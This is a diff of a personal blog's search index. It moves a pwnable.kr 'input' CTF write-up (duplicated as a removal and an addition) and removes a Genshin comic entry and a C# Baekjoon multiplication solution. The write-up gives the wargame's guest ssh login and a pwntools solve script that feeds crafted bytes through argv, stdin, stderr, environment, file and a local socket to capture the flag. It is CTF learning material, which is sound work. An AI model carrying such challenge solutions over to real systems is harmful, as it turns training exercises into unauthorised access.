@@ -837,221 +837,6 @@ Right, well this is perhaps one of
       </tags>
   </entry>
   <entry>
-    <title>『pwnable.kr』Input Problem Solving</title>
-    <url>/2020/08/04/pwnable-kr-Input-Problem-Solving/</url>
-    <content><![CDATA[<meta name="viewport" content="width=device-width, initial-scale=1">
-
-<div style="text-align: center;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/01_Rina.gif" alt="미리보기 방지" width="300">
-</div>
-
-<br>
-<br>
-
-
-
-<p>The difficulty is quite substantial,ōxō</p>
-<p><del>The difficulty is quite substantial,ōxō</del></p>
-<p>In the case of exploits</p>
-<p>I referred to someone else’s exploit code externally</p>
-<p>I referred to it.</p>
-<p>It seems to be socket programming</p>
-<p>and it’s as if I need<br>to refer to some old socket programming books</p>
-<p>lying around at home.</p>
-<p>old socket programming books.</p>
-<p>I need to refer to them.</p>
-<div style="text-align: center;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/02.png" alt="미리보기 방지" width="300">
-</div>
-
-<p><del>Kim Jong-sung</del></p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/03.png" alt="미리보기 방지" width="300">
-</div>
-
-<br>
-Screenshot 1.
-
-<p>Again, with my straightforward, literal translation, the question is as follows:</p>
-<p><strong>Mom? how can I pass my input to a computer program?</strong></p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/04.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>Screenshot.2</p>
-<p>Right, then I’ll try connecting straight away.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
-
-<p>And if I type <code>ls</code> again, you’ll see</p>
-<p>a total of 3 files appear.</p>
-<p>And then,</p>
-<p>with the <code>cat</code> command,</p>
-<p><code>input.c</code></p>
-<p>I’ll check it.</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/05.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>Screenshot.3</p>
-<p>Ba ha ha ha ha ha ha</p>
-<p>This source code, you see,</p>
-<p>is rather long, ōxō.</p>
-<p><del>is rather long, ōxō.</del></p>
-<p>Looking at it overall,<br>let’s consider the conditions<br>for passing Stage 1.</p>
-<p>let’s consider the conditions for passing.</p>
-<p>: )</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/06.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>Code.1</p>
-<p>1. Number of arguments &#x3D; 100</p>
-<p>2. argv[‘A’] &#x3D; \x00</p>
-<p>3. argv[‘B’] &#x3D; \x20\x0a\x0d</p>
-<p>If that’s the case, Stage 1 will be completed.</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/07.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>Code.2</p>
-<p>It’s Stage 2</p>
-<p>You provide <code>\x00\x0a\x00\xff</code> as stdin input</p>
-<p>you provide input,</p>
-<p>sterr,</p>
-<p>you must give<code>\\x00\\x0a\\x02\\xff</code></p>
-<p>for it to be completed.</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/08.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>Code.3</p>
-<p>stage 3.</p>
-<p>It’s an environment variable.</p>
-<p>You simply insert the value<code>\\xde\\xad\\xbe\\xef</code> be into the environment variable called</p>
-<p>into the environment variable.</p>
-<p><code>\\xca\\xfe\\xba\\xbe</code></p>
-<p>you simply insert the value.</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/09.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>Code.4</p>
-<p>It’s Stage 4</p>
-<p>You open the file called <code>\\x0a</code></p>
-<p>and the first 4 bytes that are read</p>
-<p><code>\\x00\\x00\\x00\\x00</code></p>
-<p>for it to be completed.</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/10.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>Code.5</p>
-<p>It’s Stage 5</p>
-<p><code>atoi(argv\[‘C’\]) = argv\[‘C’\]</code></p>
-<p>The value converted to an integer</p>
-<p>as the port number,</p>
-<p>you open a socket server,</p>
-<p><code>\\xde\\xad\\xbe\\xef</code></p>
-<p>and if you send it,</p>
-<p>Stage 5 will be completed.</p>
-<p>Right, then I’ll attempt the exploit.</p>
-<p>My skills aren’t quite up to<br>writing it myself just yet,</p>
-<p><a href="https://xerxes-break.tistory.com/290">so I’ll be referring to</a> exploit code</p>
-<p>so I’ll be referring to it.</p>
-<p>It’s written in Python, you see.</p>
-<p>it’s written.</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">prog = []</span><br><span class="line">prog.append(“/home/input2/<span class="built_in">input</span>”)</span><br><span class="line"><span class="comment">#prog.append(“./test”)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    prog.append(“A”)</span><br><span class="line">prog[<span class="built_in">ord</span>(“A”)]=“”</span><br><span class="line">prog[<span class="built_in">ord</span>(‘B’)]=“\x20\x0a\x0d”</span><br><span class="line">prog[<span class="built_in">ord</span>(‘C’)]=“<span class="number">35790</span>”</span><br><span class="line"> </span><br><span class="line">conn = process(prog, stderr=<span class="built_in">open</span>(“stderr”,‘r’), env=&#123;“\xde\xad\xbe\xef”:“\xca\xfe\xba\xbe”&#125;)</span><br><span class="line"><span class="built_in">print</span>(conn.recvuntil(“Stage <span class="number">1</span> clear!”))</span><br><span class="line"> </span><br><span class="line">f = <span class="built_in">open</span>(“\x0a”,‘w’)</span><br><span class="line">f.write(“\x00\x00\x00\x00”)</span><br><span class="line">f.close()</span><br><span class="line"> </span><br><span class="line">conn.sendline(“\x00\x0a\x00\xff”)</span><br><span class="line"><span class="built_in">print</span>(conn.recvuntil(“Stage <span class="number">4</span> clear!”))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">reconn = remote(“<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>”, <span class="number">35790</span>)</span><br><span class="line">reconn.send(“\xde\xad\xbe\xef”)</span><br><span class="line">reconn.close()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(conn.recvline())</span><br><span class="line"><span class="built_in">print</span>(conn.recvall())</span><br><span class="line"> </span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>Code 6.</p>
-<p>However, this code, in the current directory,</p>
-<p>can’t be used, you see.</p>
-<p>Due to a lack of permissions…。</p>
-<p>So, that’s why they say you need to use &#x2F;tmp</p>
-<p>which has the necessary permissions.</p>
-<p>Right, so from &#x2F;tmp</p>
-<p>let’s proceed.</p>
-<p>Oh, and before, I almost forgot to</p>
-<p>take a screenshot, you see.</p>
-<p>If you just run it straight,<br>it’ll say the flag file</p>
-<p>isn’t there,</p>
-<p>and the flag won’t show up.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /home/input2/flag flag</span><br></pre></td></tr></table></figure>
-
-<p>So, you have to add a symbolic link like this,</p>
-<p>and then give it a go.</p>
-<p>then, if you leave the symbolic link in place</p>
-<p>and proceed,</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/11.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>Screenshot.4</p>
-<p>A short while later, that mint-coloured bit</p>
-<p>that’s the key value, then.</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/12.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>With the key value thus acquired</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/13.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>Screenshot.5</p>
-<p>you go back to the first screen,</p>
-<p>input it into the blank space,</p>
-<p>and then just press the ‘auth’ button.</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/14.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>And as soon as the mission’s completed,</p>
-<p>you snag 4 points.</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/15.png" alt="미리보기 방지" width="300">
-</div>
-
-<p>And if you come back, you’ll see it’s marked</p>
-<p>with a green dotted line, meaning it’s been solved.</p>
-<p>it’s been marked.</p>
-<p>​</p>
-<p>Thanks for sticking through this long post.</p>
-<p>Well done, then. : )</p>
-<div style="text-alingn: right;">
-<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/16.png" alt="미리보기 방지" width="300">
-</div> <bt>
-
-<p>Have a good day, and<br>I hope everything works out well for you</p>
-<p>It’s quite warm out,<br>so do try and avoid getting heatstroke</p>
-<p>and do take care with<br>the erm, Wuhan pneumonia situation : )</p>
-<div id="disqus_thread"></div>
-<script>
-    /**
-    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
-    /*
-    var disqus_config = function () {
-    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
-    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-    };
-    */
-    (function() { // DON'T EDIT BELOW THIS LINE
-    var d = document, s = d.createElement('script');
-    s.src = 'https://kurailuna.disqus.com/embed.js';
-    s.setAttribute('data-timestamp', +new Date());
-    (d.head || d.body).appendChild(s);
-    })();
-</script>]]></content>
-      <categories>
-        <category>White Hacking</category>
-        <category>CTF</category>
-        <category>pwnable.kr</category>
-      </categories>
-      <tags>
-        <tag>White Hacking</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>『pwnable.kr』Ieg Problem Solving</title>
     <url>/2020/08/04/pwnable-kr-Ieg-Problem-Solving/</url>
     <content><![CDATA[<meta name="viewport" content="width=device-width, initial-scale=1">
@@ -1448,6 +1233,221 @@ Screenshot. 8
 <div  style="text-align: center;">
 <img  src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Memcpy%20Problem%20solving/18.png" width= 300></div>  <br>  <br>
 
+<div id="disqus_thread"></div>
+<script>
+    /**
+    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
+    /*
+    var disqus_config = function () {
+    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    */
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://kurailuna.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>]]></content>
+      <categories>
+        <category>White Hacking</category>
+        <category>CTF</category>
+        <category>pwnable.kr</category>
+      </categories>
+      <tags>
+        <tag>White Hacking</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>『pwnable.kr』Input Problem Solving</title>
+    <url>/2020/08/04/pwnable-kr-Input-Problem-Solving/</url>
+    <content><![CDATA[<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<div style="text-align: center;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/01_Rina.gif" alt="미리보기 방지" width="300">
+</div>
+
+<br>
+<br>
+
+
+
+<p>The difficulty is quite substantial,ōxō</p>
+<p><del>The difficulty is quite substantial,ōxō</del></p>
+<p>In the case of exploits</p>
+<p>I referred to someone else’s exploit code externally</p>
+<p>I referred to it.</p>
+<p>It seems to be socket programming</p>
+<p>and it’s as if I need<br>to refer to some old socket programming books</p>
+<p>lying around at home.</p>
+<p>old socket programming books.</p>
+<p>I need to refer to them.</p>
+<div style="text-align: center;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/02.png" alt="미리보기 방지" width="300">
+</div>
+
+<p><del>Kim Jong-sung</del></p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/03.png" alt="미리보기 방지" width="300">
+</div>
+
+<br>
+Screenshot 1.
+
+<p>Again, with my straightforward, literal translation, the question is as follows:</p>
+<p><strong>Mom? how can I pass my input to a computer program?</strong></p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/04.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>Screenshot.2</p>
+<p>Right, then I’ll try connecting straight away.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh input2@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<p>And if I type <code>ls</code> again, you’ll see</p>
+<p>a total of 3 files appear.</p>
+<p>And then,</p>
+<p>with the <code>cat</code> command,</p>
+<p><code>input.c</code></p>
+<p>I’ll check it.</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/05.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>Screenshot.3</p>
+<p>Ba ha ha ha ha ha ha</p>
+<p>This source code, you see,</p>
+<p>is rather long, ōxō.</p>
+<p><del>is rather long, ōxō.</del></p>
+<p>Looking at it overall,<br>let’s consider the conditions<br>for passing Stage 1.</p>
+<p>let’s consider the conditions for passing.</p>
+<p>: )</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/06.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>Code.1</p>
+<p>1. Number of arguments &#x3D; 100</p>
+<p>2. argv[‘A’] &#x3D; \x00</p>
+<p>3. argv[‘B’] &#x3D; \x20\x0a\x0d</p>
+<p>If that’s the case, Stage 1 will be completed.</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/07.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>Code.2</p>
+<p>It’s Stage 2</p>
+<p>You provide <code>\x00\x0a\x00\xff</code> as stdin input</p>
+<p>you provide input,</p>
+<p>sterr,</p>
+<p>you must give<code>\\x00\\x0a\\x02\\xff</code></p>
+<p>for it to be completed.</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/08.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>Code.3</p>
+<p>stage 3.</p>
+<p>It’s an environment variable.</p>
+<p>You simply insert the value<code>\\xde\\xad\\xbe\\xef</code> be into the environment variable called</p>
+<p>into the environment variable.</p>
+<p><code>\\xca\\xfe\\xba\\xbe</code></p>
+<p>you simply insert the value.</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/09.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>Code.4</p>
+<p>It’s Stage 4</p>
+<p>You open the file called <code>\\x0a</code></p>
+<p>and the first 4 bytes that are read</p>
+<p><code>\\x00\\x00\\x00\\x00</code></p>
+<p>for it to be completed.</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/10.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>Code.5</p>
+<p>It’s Stage 5</p>
+<p><code>atoi(argv\[‘C’\]) = argv\[‘C’\]</code></p>
+<p>The value converted to an integer</p>
+<p>as the port number,</p>
+<p>you open a socket server,</p>
+<p><code>\\xde\\xad\\xbe\\xef</code></p>
+<p>and if you send it,</p>
+<p>Stage 5 will be completed.</p>
+<p>Right, then I’ll attempt the exploit.</p>
+<p>My skills aren’t quite up to<br>writing it myself just yet,</p>
+<p><a href="https://xerxes-break.tistory.com/290">so I’ll be referring to</a> exploit code</p>
+<p>so I’ll be referring to it.</p>
+<p>It’s written in Python, you see.</p>
+<p>it’s written.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">prog = []</span><br><span class="line">prog.append(“/home/input2/<span class="built_in">input</span>”)</span><br><span class="line"><span class="comment">#prog.append(“./test”)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    prog.append(“A”)</span><br><span class="line">prog[<span class="built_in">ord</span>(“A”)]=“”</span><br><span class="line">prog[<span class="built_in">ord</span>(‘B’)]=“\x20\x0a\x0d”</span><br><span class="line">prog[<span class="built_in">ord</span>(‘C’)]=“<span class="number">35790</span>”</span><br><span class="line"> </span><br><span class="line">conn = process(prog, stderr=<span class="built_in">open</span>(“stderr”,‘r’), env=&#123;“\xde\xad\xbe\xef”:“\xca\xfe\xba\xbe”&#125;)</span><br><span class="line"><span class="built_in">print</span>(conn.recvuntil(“Stage <span class="number">1</span> clear!”))</span><br><span class="line"> </span><br><span class="line">f = <span class="built_in">open</span>(“\x0a”,‘w’)</span><br><span class="line">f.write(“\x00\x00\x00\x00”)</span><br><span class="line">f.close()</span><br><span class="line"> </span><br><span class="line">conn.sendline(“\x00\x0a\x00\xff”)</span><br><span class="line"><span class="built_in">print</span>(conn.recvuntil(“Stage <span class="number">4</span> clear!”))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#sleep(3)</span></span><br><span class="line">reconn = remote(“<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>”, <span class="number">35790</span>)</span><br><span class="line">reconn.send(“\xde\xad\xbe\xef”)</span><br><span class="line">reconn.close()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(conn.recvline())</span><br><span class="line"><span class="built_in">print</span>(conn.recvall())</span><br><span class="line"> </span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Code 6.</p>
+<p>However, this code, in the current directory,</p>
+<p>can’t be used, you see.</p>
+<p>Due to a lack of permissions…。</p>
+<p>So, that’s why they say you need to use &#x2F;tmp</p>
+<p>which has the necessary permissions.</p>
+<p>Right, so from &#x2F;tmp</p>
+<p>let’s proceed.</p>
+<p>Oh, and before, I almost forgot to</p>
+<p>take a screenshot, you see.</p>
+<p>If you just run it straight,<br>it’ll say the flag file</p>
+<p>isn’t there,</p>
+<p>and the flag won’t show up.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /home/input2/flag flag</span><br></pre></td></tr></table></figure>
+
+<p>So, you have to add a symbolic link like this,</p>
+<p>and then give it a go.</p>
+<p>then, if you leave the symbolic link in place</p>
+<p>and proceed,</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/11.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>Screenshot.4</p>
+<p>A short while later, that mint-coloured bit</p>
+<p>that’s the key value, then.</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/12.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>With the key value thus acquired</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/13.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>Screenshot.5</p>
+<p>you go back to the first screen,</p>
+<p>input it into the blank space,</p>
+<p>and then just press the ‘auth’ button.</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/14.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>And as soon as the mission’s completed,</p>
+<p>you snag 4 points.</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/15.png" alt="미리보기 방지" width="300">
+</div>
+
+<p>And if you come back, you’ll see it’s marked</p>
+<p>with a green dotted line, meaning it’s been solved.</p>
+<p>it’s been marked.</p>
+<p>​</p>
+<p>Thanks for sticking through this long post.</p>
+<p>Well done, then. : )</p>
+<div style="text-alingn: right;">
+<img src="https://luna0x03.github.io/PostImages/White%20Hacking/CTF/pwnable.kr/Input%20Problem%20Solving/16.png" alt="미리보기 방지" width="300">
+</div> <bt>
+
+<p>Have a good day, and<br>I hope everything works out well for you</p>
+<p>It’s quite warm out,<br>so do try and avoid getting heatstroke</p>
+<p>and do take care with<br>the erm, Wuhan pneumonia situation : )</p>
 <div id="disqus_thread"></div>
 <script>
     /**
@@ -1983,31 +1983,6 @@ Alright then,
       </tags>
   </entry>
   <entry>
-    <title>【漫画】スクロースの研究日誌</title>
-    <url>/2025/08/24/%E6%BC%AB%E7%94%BB-%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%82%B9%E3%81%AE%E7%A0%94%E7%A9%B6%E6%97%A5%E8%AA%8C/</url>
-    <content><![CDATA[<meta name="viewport" content="width=device-width, initial-scale=1">
-
-
-<div style="text-align: center;">
-<img src="https://luna0x03.github.io/PostImages/(ETC)%20Taking%20a%20Break/%E3%80%90Genshin%E3%80%91Cartoons/1.%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%82%B9%E3%81%AE%E7%A0%94%E7%A9%B6%E6%97%A5%E8%AA%8C/1.jpg" alt="" >
-</div><br><br>
-
-
-<div style="text-align: center;">
-<img src="https://luna0x03.github.io/PostImages/(ETC)%20Taking%20a%20Break/%E3%80%90Genshin%E3%80%91Cartoons/1.%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%82%B9%E3%81%AE%E7%A0%94%E7%A9%B6%E6%97%A5%E8%AA%8C/2.jpg" alt="" >
-</div><br><br>
-
-<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><blockquote class="twitter-tweet"><p lang="ja" dir="ltr">推しの誕生日…言葉は要らない…<a href="https://twitter.com/hashtag/%E5%8E%9F%E7%A5%9E?src=hash&amp;ref_src=twsrc%5Etfw">#原神</a> <a href="https://twitter.com/hashtag/GenshinImpact?src=hash&amp;ref_src=twsrc%5Etfw">#GenshinImpact</a> <a href="https://twitter.com/hashtag/%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%82%B9?src=hash&amp;ref_src=twsrc%5Etfw">#スクロース</a> <a href="https://twitter.com/hashtag/Sucrose?src=hash&amp;ref_src=twsrc%5Etfw">#Sucrose</a> <a href="https://twitter.com/hashtag/%E3%82%B9%E3%82%AF%E3%83%AD%E3%83%BC%E3%82%B9%E7%94%9F%E8%AA%95%E7%A5%AD2021?src=hash&amp;ref_src=twsrc%5Etfw">#スクロース生誕祭2021</a> <a href="https://twitter.com/hashtag/%E5%8E%9F%E7%A5%9E_%E3%82%AD%E3%83%A3%E3%83%A9%E7%94%9F%E8%AA%95%E7%A5%AD?src=hash&amp;ref_src=twsrc%5Etfw">#原神_キャラ生誕祭</a> <a href="https://t.co/8lJS6ERZCV">pic.twitter.com/8lJS6ERZCV</a></p>&mdash; アリクイのイカク (@arikuigames1105) <a href="https://twitter.com/arikuigames1105/status/1463885185875808261?ref_src=twsrc%5Etfw">November 25, 2021</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
-]]></content>
-      <categories>
-        <category>(ETC) Taking a Break</category>
-        <category>【Genshin】Cartoons</category>
-      </categories>
-      <tags>
-        <tag>ETC</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>미국 배당주 심플계산기</title>
     <url>/2025/04/14/%EB%AF%B8%EA%B5%AD-%EB%B0%B0%EB%8B%B9%EC%A3%BC-%EC%8B%AC%ED%94%8C%EA%B3%84%EC%82%B0%EA%B8%B0/</url>
     <content><![CDATA[<meta name="viewport" content="width=device-width, initial-scale=1">
@@ -2264,77 +2239,6 @@ Alright then,
       </tags>
   </entry>
   <entry>
-    <title>『ベクジュン·アルゴリズム』掛け算</title>
-    <url>/2023/07/05/Baekjoon/Baekjoon_multiply_2588/</url>
-    <content><![CDATA[<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-
-<div style="text-align: center;">
-<img src="https://luna0x03.github.io/PostImages/DevDiary/Baekjoon(JP)/2588/Baekjoon.png" alt="미리보기 방지" width="450">
-</div>
-
-<style>
-.left-img {
-  float: left;
-  margin-right: 320; /* 텍스트와 간격 */
-}
-</style>
-
-
-<h2 id="ベクジュン·オンライン·ジャージー-掛け算"><a href="#ベクジュン·オンライン·ジャージー-掛け算" class="headerlink" title="ベクジュン·オンライン·ジャージー &#x2F; 掛け算"></a>ベクジュン·オンライン·ジャージー &#x2F; 掛け算</h2><br>
-
-<h2 id="2588"><a href="#2588" class="headerlink" title="2588"></a>2588</h2><p>📎Link : <br><br><a href="https://www.acmicpc.net/problem/2588">https://www.acmicpc.net/problem/2588</a></p>
-<br>
-
-<h3 id="指紋表示"><a href="#指紋表示" class="headerlink" title="指紋表示"></a>指紋表示</h3><br>
-<div class="left-img">
-<img src="https://luna0x03.github.io/PostImages/DevDiary/Baekjoon(JP)/2588/01.jpg" alt="미리보기 방지" width="250%">
-</div> <br> <br><br><br><br><br><br><br><br><br><br>
-
-<br>
-
-<h3 id="解答『かいとう』"><a href="#解答『かいとう』" class="headerlink" title="解答『かいとう』"></a>解答『かいとう』</h3><h3 id="コード"><a href="#コード" class="headerlink" title="コード"></a>コード</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">static</span> System.Console;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">boj</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> a = ReadLine();</span><br><span class="line">            <span class="built_in">string</span> b = ReadLine();</span><br><span class="line"></span><br><span class="line">            WriteLine(<span class="built_in">int</span>.Parse(a) * (<span class="built_in">int</span>)Char.GetNumericValue(b[<span class="number">2</span>]));</span><br><span class="line">            WriteLine(<span class="built_in">int</span>.Parse(a) * (<span class="built_in">int</span>)Char.GetNumericValue(b[<span class="number">1</span>]));</span><br><span class="line">            WriteLine(<span class="built_in">int</span>.Parse(a) * (<span class="built_in">int</span>)Char.GetNumericValue(b[<span class="number">0</span>]));</span><br><span class="line">            WriteLine(<span class="built_in">int</span>.Parse(a) * <span class="built_in">int</span>.Parse(b));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<h3 id="結果『けっか』"><a href="#結果『けっか』" class="headerlink" title="結果『けっか』"></a>結果『けっか』</h3><br>
-<div class="left-img">
-<img src="https://luna0x03.github.io/PostImages/DevDiary/Baekjoon(JP)/2588/002.png" alt="미리보기 방지" width="580">
-</div> <br> <br> <br> <br> <br> <br> <br> <br> <br> 
-
-
-<div style="text-align: center;">
-<p style="font-size: 30px; color: #2844e2ff;"> 終わり</p>
-</div>
-
-<div id="disqus_thread"></div>
-<script>
-    /**
-    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
-    /*
-    var disqus_config = function () {
-    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
-    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-    };
